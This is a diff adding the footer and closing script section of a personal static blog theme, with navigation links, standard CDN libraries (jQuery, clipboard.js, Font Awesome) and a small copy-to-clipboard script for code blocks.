+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    Andy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
